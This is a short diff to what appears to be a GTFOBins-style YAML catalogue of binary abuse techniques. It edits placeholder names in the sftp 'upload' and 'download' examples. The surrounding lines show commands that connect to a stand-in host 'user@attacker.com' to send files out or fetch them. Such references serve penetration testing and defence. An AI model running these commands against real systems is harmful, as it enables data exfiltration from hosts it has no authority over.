@@ -15,11 +15,11 @@ functions:
       code: |
         RHOST=user@attacker.com
         sftp $RHOST
-        put file_to_send where_to_save
+        put file_to_send file_to_save
   download:
     - description: Fetch a remote file from a SSH server.
       code: |
         RHOST=user@attacker.com
         sftp $RHOST
-        get file_to_get where_to_save
+        get file_to_get file_to_save
 ---
